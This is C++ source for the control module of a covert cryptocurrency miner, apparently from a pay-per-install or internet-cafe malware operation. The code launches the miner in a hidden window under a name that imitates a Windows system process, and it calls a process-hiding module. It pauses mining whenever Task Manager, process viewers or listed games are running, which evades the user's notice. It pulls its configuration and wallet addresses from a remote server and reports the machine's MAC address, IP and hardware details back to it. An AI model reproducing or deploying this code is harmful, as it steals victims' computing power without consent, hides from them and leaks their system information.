/*
 * @��  ��  ����XPMMonitor.cpp
 * @˵      ����CMonitorʵ��
 * @��      �ڣ�Created on: 2014/03/03
 * @��      Ȩ��Copyright 2014
 * @��      �ߣ�MCA
 */

#include "StdAfx.h"
#include "ResTool.h"
#include "CxLog.h"
#include "CPUInfo.h"
#include <Shlwapi.h>
#include "HardInfo.h"
#include "HttpHelp.h"
#include <tlhelp32.h>
#include <psapi.h>
#include <algorithm>
#include "md5.h"
#include "IPCModule.h"
#include "HideProc.h"
#include "Monitor.h"

#pragma comment(lib, "Psapi.lib")

#define RUN_STATUS_INIT		(1)
#define RUN_STATUS_RUN		(2)
#define RUN_STATUS_STOP		(3)

#define MINING_EXE			TEXT("cssrs.exe")
#define TASKMGR_PARH        TEXT("SYSTEM32\\TASKMGR.EXE")	// ���������·��
#define MONITOR_INTERVAL	500								// ��ʱʱ����500ms
#define MAX_FILELD_LENGTH   64                              // �����ֶγ���
#define MAX_DELAY_RUNTIME	6								// ���������ʱʱ��3s
#define MAX_DELAY_TIME		4								// ������С�ֹͣ��ʱʱ��2s
#define TIEM_SECOND_1		(2)								// 1��
#define TIME_SECOND_5		(5 * TIEM_SECOND_1)				// 5��
#define TIEM_SECOND_20		(20 * TIEM_SECOND_1)			// 20��
#define TIEM_SECOND_30		(30 * TIEM_SECOND_1)			// 30��
#define TIME_MINUTE_1		(1*60*TIEM_SECOND_1)			// 1����

#define MD5SIG				TEXT("awangba.com")

#define LEOCONF_URL			_T("http://domain.52wblm.com/XtTow/Cloud/LeoCoin/conf.ini");
#define ATCCONF_URL			_T("http://domain.52wblm.com/XtTow/Cloud/AtCoin/conf.ini");

#define CONF_URL			LEOCONF_URL

// �û���Ϣ
TCHAR g_szUserName[MAX_FILELD_LENGTH] =  { 0 };
TCHAR g_szUserId[MAX_FILELD_LENGTH]   =  { 0 };
TCHAR g_szMainUserName[MAX_FILELD_LENGTH]      =  { 0 };
vector<CString> g_vPools;

CONFIGINFO config;
 
BOOL CMonitor::SendRuningStatus(CString strUserType, DWORD dwErrCode)
{
	CString strUrl = TEXT("/stat/eda");
	CString body;

	body.Format(TEXT("pw=%s&id=%s&user=%s&type=%s&mac=%s&cpun=%d&cpux=%d&sysinfo=%s&ip=%s&worker=%d"),
		CMd5::GetSignature(MD5SIG),
		g_szUserId,
		g_szUserName,
		strUserType,
		m_strMac,
		m_dwCoreNum,
		m_dwThreadNum,
		CHardInfo::GetInstance().GetSysInfo(),
		m_strIP,
		dwErrCode
	);

	CString strRetData;

	return CHttpHelp::GetInstance().PostReq(strUrl, body, strRetData);
}

 /**
  * \brief  ö�ٽ��̹���������
  * \return ��ȡ�ķ���ֵ
  */
BOOL CMonitor::EnumTaskMgr()
{
	HANDLE procSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (procSnap == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	BOOL bIsFound = FALSE;
	PROCESSENTRY32 procEntry = { 0 };

	procEntry.dwSize = sizeof(PROCESSENTRY32);
	BOOL bRet = Process32First(procSnap, &procEntry);

	while (bRet) {
		// �������������ʱ
		if (!_tcscmp(procEntry.szExeFile, TEXT("taskmgr.exe"))) {
			bIsFound = TRUE;
			goto EXIT;
		}

		// ���̲鿴������
		for(size_t i = 0; i < config.vProcList.size(); i++) {
			if (_tcsstr(procEntry.szExeFile, config.vProcList[i])) {
				bIsFound = TRUE;
				goto EXIT;
			}
		}

		// ��Ϸ����
		if (m_dwCoreNum <= config.Game_MinCore) {
			for(size_t i = 0; i < config.vGameList.size(); i++) {
				if (_tcsstr(procEntry.szExeFile, config.vGameList[i])) {
					bIsFound = TRUE;
					goto EXIT;
				}
			}
		}

		// �ر�CPU��һ������
		if (m_dwCoreNum <= config.Cpu_MinCore) {
			for (size_t i = 0; i < config.vCpuGameList.size(); i++) {
				if (_tcsstr(procEntry.szExeFile, config.vCpuGameList[i])) {
					bIsFound = TRUE;
					goto EXIT;
				}
			}
		}
		
		bRet = Process32Next(procSnap, &procEntry);
	}

EXIT:
	CloseHandle(procSnap);

	return bIsFound;
}

 /**
  * \brief  �������
  * \return ����ֵ
  */
BOOL CMonitor::StartWorker(CString &strWalletAddres)
{
	BOOL bRet;
	CString strPath;
	CString strFile;
	
	strPath = CUtility::GetInstance().GetCurrentPath();
	strFile = strPath + _T("\\") + config.vMining[m_dwMiningIndex].name;

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	ZeroMemory(&pi, sizeof(pi));

	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	INT i = CUtility::GetInstance().GetRadomNum(config.vMining[m_dwMiningIndex].pools.size());
	CString strParam;
	strParam.Format(config.vMining[m_dwMiningIndex].cmd,
		strFile,
		config.vMining[m_dwMiningIndex].pools[i],
		strWalletAddres,
		m_dwCpus
	);

	bRet = CreateProcess(
		NULL,
		strParam.GetBuffer(),
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&si,
		&pi
	);

	if (bRet) {
		LOG1(TEXT("%s"), strParam);
		m_hProcess = pi.hProcess;
		CHideProcModule::HideProcess(pi.dwProcessId, TEXT("mining"));
	}

	return TRUE;
}

 /**
  * \brief  ֹͣ���
  * \return ����ֵ
  */
BOOL CMonitor::StopWorker()
{
	return TerminateProcess(m_hProcess, 0);
}

 /**
  * \brief  �������״̬
  * \return �����Ƿ���������
  */
BOOL CMonitor::IsRun()
{
	if (!m_hProcess) {
		return FALSE;
	}

	DWORD dwCode = WaitForSingleObject(m_hProcess, 100);
	if (dwCode == WAIT_TIMEOUT) {
		return TRUE;
	}

	m_hProcess = NULL;

	return FALSE;
}

 /**
  * \brief  ��ȡ�û��Ƽ��������ļ�url·��
  * \return �Ƿ����سɹ�
  */
BOOL CMonitor::GetConfigUrl(CString &strOutUrl)
{
	//CString strHost = TONGJI_URL;
	//CString strUrl = TEXT("/eda/cpuConfig?u=");
	//strUrl += g_szUserName;

	//return CHttpHelp::GetInstance().GetReq(strHost, strUrl, strOutUrl);
	strOutUrl = CONF_URL;

	return TRUE;
}

/**
* \brief  �����û��Ƽ��������ļ�
* \return �Ƿ����سɹ�
*/
BOOL CMonitor::DownloadConfFile(CString &strUrl, CString &strFileName)
{
	return CHttpHelp::GetInstance().FromUrlToFile(strUrl, strFileName);
}

 /**
  * \brief  ���ؿ���б��ļ�
  * \return �Ƿ����سɹ�
  */
//BOOL CMonitor::GetPoolsList()
//{
//	CString strUrl = config.poolurl;
//	CString strHost = config.poolhost;
//
//	CString data;
//	if (!CHttpHelp::GetInstance().GetReq(strHost, strUrl, data)) {
//		return FALSE;
//	}
//
//	CUtility::GetInstance().SplitString(data, TEXT("\r\n"), g_vPools);
//
//	return TRUE;
//}

BOOL CMonitor::ReadConfigParam()
{
	config.UseCore = 0;
	config.ValidTime = 180;
	config.MonTime	 = 30;
	config.Max   = 96;
	config.Min   = 30;
	config.Cpu_MinCore = 2;
	config.Game_MinCore = 2;

	CString strUrl;
	if (!GetConfigUrl(strUrl)) {
		return FALSE;
	}

	CUtility& pUtility = CUtility::GetInstance();

	CString strFileName = CUtility::GetInstance().GetCurrentPath();
	strFileName += TEXT("\\cloudconf.ini");
	if (!DownloadConfFile(strUrl, strFileName)) {
		return FALSE;
	}

	CString strValue;
	CString strSection = TEXT("conf");
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("valid"), strValue)) {		// ��Чʱ�� Ĭ��3Сʱ
		config.ValidTime = StrToInt(strValue);
	}
		
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("hbeat"), strValue)) {		// ����ʱ�� Ĭ��30����
		config.MonTime = StrToInt(strValue);
	}
	
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("cpumax"), strValue)) {		// ���cpuʹ����
		config.Max = StrToInt(strValue);
	}

	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("cpumin"), strValue)) {		// ��Сcpuʹ����
		config.Min = StrToInt(strValue);
	}

	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("mincore"), strValue)) {		// �����Ƽ�����Сcpu�ں���
		config.Cpu_MinCore = StrToInt(strValue);
	}

	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("coins"), strValue)) {		// �����Ƽ�����Сcpu�ں���
		vector<CString> vCoins;
		pUtility.SplitString(strValue, TEXT("&"), vCoins);
		for (size_t i = 0; i < vCoins.size(); i++) {
			tMining m;
			pUtility.GetKeyValue(strFileName, vCoins[i], TEXT("mining"), strValue);

			if (strValue[0] == _T('@')) {
				m.name = strValue.Mid(1);
				// ��ȡ�ض�cpu�ͺŵ����ù���
				strSection = TEXT("cpulist");
				if (pUtility.GetKeyValue(strFileName, strSection, TEXT("cpus"), strValue)) {
					vector<CString> vCpus;
					pUtility.SplitString(strValue, TEXT("&"), vCpus);
					for (size_t i = 0; i < vCpus.size(); i++) {
						if (m_strCpuName.Find(vCpus[i]) != -1) {
							if (pUtility.GetKeyValue(strFileName, vCpus[i], TEXT("mincore"), strValue)) {
								config.Cpu_MinCore = StrToInt(strValue);
							}
							if (pUtility.GetKeyValue(strFileName, vCpus[i], TEXT("lists"), strValue)) {
								pUtility.SplitString(strValue, TEXT("&"), config.vCpuGameList);
							}

							pUtility.GetKeyValue(strFileName, vCpus[i], TEXT("mining"), m.name);
							break;
						}
					}
				}
			} else {
				m.name = strValue;
			}

			if (pUtility.GetKeyValue(strFileName, vCoins[i], TEXT("pool"), strValue)) {
				pUtility.SplitString(strValue, _T("&"), m.pools);
			}
			if (pUtility.GetKeyValue(strFileName, vCoins[i], TEXT("addr"), m.addr)) {
				if (m.addr == _T("null")) {
					GetWalletAddres(g_szUserName, m.addr);
				}
			}

			pUtility.GetKeyValue(strFileName, vCoins[i], TEXT("cmd"), m.cmd);
			config.vMining.push_back(m);
		}
	}

	//if (!pUtility.GetKeyValue(strFileName, strSection, TEXT("addr"), config.addr)) {		// Ǯ����ַ
	//	return FALSE;
	//}

	//if (!pUtility.GetKeyValue(strFileName, strSection, TEXT("mining"), config.mining)) {	// �������
	//	return FALSE;
	//}

	//strSection = TEXT("pool");			// �������
	//if (!pUtility.GetKeyValue(strFileName, strSection, TEXT("host"), config.poolhost)) {		// ����б��ļ�������ַ
	//	return FALSE;
	//}

	//if (!pUtility.GetKeyValue(strFileName, strSection, TEXT("url"), config.poolurl)) {		// ����б��ļ�url
	//	return FALSE;
	//}

	strSection = TEXT("sysproc");		// ϵͳ����
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("lists"), strValue)) {
		pUtility.SplitString(strValue, TEXT("&"), config.vProcList);
	}

	strSection = TEXT("gameproc");		// ��Ϸ����
	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("mincore"), strValue)) {		// ������Ϸ����С�Ϻ���
		config.Game_MinCore = StrToInt(strValue);
	}

	if (pUtility.GetKeyValue(strFileName, strSection, TEXT("lists"), strValue)) {
		pUtility.SplitString(strValue, TEXT("&"), config.vGameList);
	}

	DeleteFile(strFileName);

	return TRUE;
}

BOOL CMonitor::GetUserInfo(LPTSTR lpCmdLine)
{
	CString strCmd = lpCmdLine;
	CString strVal;

	CUtility& pUtility = CUtility::GetInstance();
	if (!pUtility.GetKeyFormString(strCmd, TEXT("uname"), TEXT(" "), strVal)) {
		return FALSE;
	}
	_sntprintf_s(g_szMainUserName, MAX_FILELD_LENGTH, _TRUNCATE, TEXT("%s"), strVal);
	
	if (!pUtility.GetKeyFormString(strCmd, TEXT("uid"), TEXT(" "), strVal)) {
		return FALSE;
	}
	_sntprintf_s(g_szUserId, MAX_FILELD_LENGTH, _TRUNCATE, TEXT("%s"), strVal);

	if (!pUtility.GetKeyFormString(strCmd, TEXT("ip"), TEXT(" "), m_strIP)) {
		return FALSE;
	}

	vector<CString> vUserList;
	CString strUName = g_szMainUserName;
	pUtility.SplitString(strUName, TEXT("_"), vUserList);
	if (vUserList.size() == 2) {
		_sntprintf_s(g_szUserName, MAX_FILELD_LENGTH, _TRUNCATE, TEXT("%s_%s"), vUserList[0], vUserList[1]);
	}
	else {
		_sntprintf_s(g_szUserName, MAX_FILELD_LENGTH, _TRUNCATE, TEXT("%s"), g_szMainUserName);
	}

	return TRUE;
}

BOOL CMonitor::GetWalletAddres(LPTSTR szUserName, CString& strWalletAddres)
{
	CString strUrl = TEXT("/eda/address");

	DWORD dwOSBit;
	if (CUtility::GetInstance().Is64BitOS()) {
		dwOSBit = 64;
	} else {
		dwOSBit = 32;
	}

	CString body;
	body.Format(TEXT("type=cpu&version=cpu1.0&user=%s&son=%s&pw=%s&osbit=%d&client=1.0"),
		g_szMainUserName,
		g_szUserName,
		CMd5::GetSignature(TEXT("getEdaAddress.awangba.com")),
		dwOSBit
	);

	return CHttpHelp::GetInstance().PostReq(strUrl, body, strWalletAddres);
}

BOOL CMonitor::IsExit()
{
	if ((m_dwCoreNum < config.Cpu_MinCore) || (m_dwCpus == 0)) {
		return TRUE;
	}

	return FALSE;
}

BOOL CMonitor::GetSystemInfo()
{
	// ��ȡcpu��Ϣ
	CCPUInfo cpuinfo;
	m_strCpuName = cpuinfo.GetCPUName();
	m_dwCoreNum = cpuinfo.GetCPUNumbers();
	m_dwThreadNum = cpuinfo.GetCPUThreads();

	// ��ȡϵͳ��Ϣ
	m_strMac = CHardInfo::GetInstance().GetMac();
	m_strSys = CHardInfo::GetInstance().GetSysInfo();

	return TRUE;
}

BOOL CMonitor::SetUseCoreCount()
{
	m_dwCpus = config.UseCore;

	if (m_dwCpus == 0) {
		if (m_dwCoreNum < 4) {
			m_dwCpus = 1;
		}
		else if ((m_dwCoreNum == 4) || (m_dwCoreNum == 6)) {
			m_dwCpus = 2;
		}
		else {
			m_dwCpus = m_dwCoreNum / 2;
		}
	}

	return TRUE;
}

 /**
  * \brief  ��ʼ����
  * \return ����ֵ
  */
BOOL CMonitor::StartMonitor(LPTSTR lpCmdLine)
{
	DWORD dwPer = 0;
	BOOL  bIsSendValidData = FALSE;			// ��Сʱ�Ƿ��ϱ�
	DWORD dwReportedTime = 0;				// �ϱ���ʱ��
	DWORD dwValidHourTime   = 0;			// ��Ч��ʱ��
	DWORD dwTime = 0;						// ��ʱ��

	INT iWaitRun = 0;
	INT iWaitKill = 0;

	SYSTEMTIME tPrevTime;
	GetLocalTime(&tPrevTime);
	DWORD dwDay = tPrevTime.wDay;

	BOOL bTaskmgrRun = FALSE;
	LOG(lpCmdLine);
	BOOL bRet = GetUserInfo(lpCmdLine);
	if (!bRet) {
		return FALSE;
	}

	// ��ȡϵͳ��Ϣ
	GetSystemInfo();
	ReadConfigParam();			// ��ȡ�������ò���
	SetUseCoreCount();			// ����ʹ��CPU�ĺ�����
	if (IsExit()) {				// �ж��Ƿ��˳�
		return FALSE;
	}

	//bRet = GetPoolsList();		// ��ȡ����б�
	//if (!bRet) {
	//	return FALSE;
	//}

	//CString strWallet;
	//do {
	//	bRet = GetWalletAddres(g_szUserName, strWallet);
	//	if (!bRet) {
	//		Sleep(300000);		// �ӳ�5���ӣ��ٴ�����
	//	}
	//} while(!bRet);

	SendRuningStatus(TEXT("eda0"), 0);
	DWORD dwCurRunStatus = RUN_STATUS_INIT;

	UINT_PTR s_MonitorTimerId = SetTimer(NULL, NULL, MONITOR_INTERVAL, NULL);	// ��ʱʱ����500ms
	CCPUInfo cpu;
	while (1) {
		dwTime ++;
		if (dwTime >= TIME_MINUTE_1) {
			dwTime = 0;
			dwReportedTime  ++;
			dwValidHourTime ++;
		}

		// ��ȡCPU��ʹ����
		dwPer = cpu.GetCPUUseRate();
		bTaskmgrRun = EnumTaskMgr();

		if (dwPer <= config.Min) {
			if (iWaitRun < MAX_DELAY_RUNTIME) {
				iWaitRun ++;
			}
			
			iWaitKill = 0;
		} else {
			iWaitRun = 0;
		}

		if (dwPer > config.Max) {
			if (iWaitKill < MAX_DELAY_TIME) {
				iWaitKill ++;
			}

			iWaitRun = 0;
		} else {
			iWaitKill = 0;
		}
		LOG1(TEXT("use:%d"), dwPer);
		if ((iWaitRun >= MAX_DELAY_RUNTIME) && !bTaskmgrRun) {
			if (!IsRun()) {

				if ((m_dwMiningIndex < config.vMining.size() -1) && dwCurRunStatus == RUN_STATUS_RUN) {	// �л����
					m_dwMiningIndex++;
					SendRuningStatus(TEXT("eda"), 5);
				}
				dwTime = 0;
				dwReportedTime  = 0;		// ��ʱ����0
				dwValidHourTime = 0;
				bRet = StartWorker(config.vMining[m_dwMiningIndex].addr);
				LOG(TEXT("StartWork"));
				if (bRet) {
					dwCurRunStatus = RUN_STATUS_RUN;
				}
			}
		} 
		
		if ((iWaitKill >= MAX_DELAY_TIME) || bTaskmgrRun) {
			if (IsRun()) {
				StopWorker();
				dwCurRunStatus = RUN_STATUS_STOP;
			}
		}

		// ����ʱ�ϱ�����
		if (dwCurRunStatus == RUN_STATUS_RUN) {
			// ʮ�����ϱ�����
			if (dwReportedTime >= config.MonTime) {
				dwReportedTime = 0;
				SendRuningStatus(TEXT("eda"), 0);

				SYSTEMTIME tt;
				GetLocalTime(&tt);
				if (dwDay != tt.wDay) {
					bIsSendValidData = FALSE;
					dwDay = tt.wDay;
					dwValidHourTime = 0;
				}
			}

			// ��Сʱ�ϱ�����
			if (!bIsSendValidData && (dwValidHourTime >= config.ValidTime)) {
				dwValidHourTime = 0;
				SendRuningStatus(TEXT("eda1"), 0);
				bIsSendValidData = TRUE;
			}
		}

		MSG msg;
		if (GetMessage (&msg, NULL, 0, 0)) {
			if (msg.message == WM_QUIT) {
				break;
			}

			TranslateMessage (&msg);
			DispatchMessage (&msg); 
		}
	}

	KillTimer(NULL, s_MonitorTimerId);

	return 0;
}